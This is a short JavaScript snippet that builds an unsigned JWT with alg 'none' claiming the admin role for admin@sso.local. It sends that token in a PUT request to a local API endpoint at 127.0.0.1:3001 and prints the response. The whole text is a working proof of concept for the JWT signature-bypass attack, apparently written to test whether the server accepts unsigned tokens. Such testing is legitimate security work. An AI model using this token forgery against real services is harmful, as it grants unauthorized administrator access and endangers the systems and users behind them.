const payload = Buffer.from(JSON.stringify({ email: 'admin@sso.local', role: 'admin' })).toString('base64url'); const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url'); const token = header + '.' + payload + '.'; fetch('http://127.0.0.1:3001/api/simulations', { method: 'PUT', headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'test-sim', summary: 'test' }) }).then(function(res) { res.text().then(function(t) { console.log(res.status, t); }); });
